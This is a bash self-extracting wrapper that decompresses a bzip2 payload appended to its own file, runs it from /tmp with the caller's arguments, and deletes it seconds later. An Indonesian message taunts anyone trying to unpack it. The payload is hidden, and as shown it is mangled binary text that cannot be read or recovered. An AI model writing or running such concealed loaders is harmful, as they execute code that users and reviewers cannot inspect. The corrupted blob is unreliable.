#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SY��� ��E�@ ���?�������@�D@0  `����Ǹ���i*R����OSh�&	�2i����G�OS�4@i����h44424 ��� L@h4�hOHmM4@���0F@@4 ��@�S�I�3@#F� C�� G��6��DL&�$�ɦ��C@�4 �hH $���M<���i��=Q�446�h�����i���=#���K��M��bo�9QTQ��tt��,�yl�AX�KXz��p��k��8e�z�a�&Q�}�O"�-�eL�fE
[R��L�ayd���a@�T��f7_�7R_-Į:%۬���V��:��J ��d���C����v����Zͻm²��ce����h���,#]���ԔQ{�Ut��}d<��L�"킹J����Ϻ��������������R��U��2L�sny+9����*�8��6��!!ȫ��+�C�-Њ
T�QEQEQLyH�)%"��(��_�@��)�Z��f��.)ٰ���q1}�%�^�r]��"s£1P�`�h�g1����c��G����ǮaD��3�͜�a��6+n�2W�J/9�Q?z ?!Ya�$ְ�+T�T�o��DH��"U�t��s�XcHb��4����0��c7��m����2��5������/q+E2*"�(��(��>"$I�u7
�n�����P�����]B�6!|/��<
v��yX���G���၁��y��� @l�W)�Ϋ4���Qb�ܔs-us�F�
�.�+wpDZŃQ�pq8�c� ^k>j�vW�+9� �֐�`7��
��f����V��p����MHc����i.8�vY͝v�0�p
�̎��% �����}���у�涝5yk|fGH>g��mj����Ǿ9S�T��&�7!!��#�DֳJh�%1�N
t6��I/lg�+�﷕�V���L������l�8���1�~vY\��Na�C����d��,��%��PB�,�Hfqd*x�/[�3v^�d����'�X/ ;�A�+X�*��^ՙ2�:������A�Ez�CQ剳i`5!���ٰw]�D�&�R/���r�\7��+kvgkh���wʜc`�b	7'8�Q\�]/'\W=�B�C���_�{�ɺ7��=�0�[@9�X�͊�-�B/Gv��䫣�y�c�1�c�1�a�1��}b,ɱ&��㼢��!B�!!J)�dsy�j[HH���p�f�Lo�( jyM@�wN�쨸i%�U�tax���!mq�ɳ���D(�(�hJ*�W:t��w��:Utm�������Ef��
������C���pyD]@:��Ap�sW }'Q+�1���{0aB@ס��k�����2�W`v�`�?KB+��m�r8m���B�\MJ� �������Q���+\r�<{e[��1�o�I$��=
��d�d�A�+gM�IA��HM2I�4�Ej�Ԩo[��h�f�BI$��I5�^+9�woJ�f-7xT[#F���E�7�0t����9Ht���	���U/Q� EU��H�
>\ 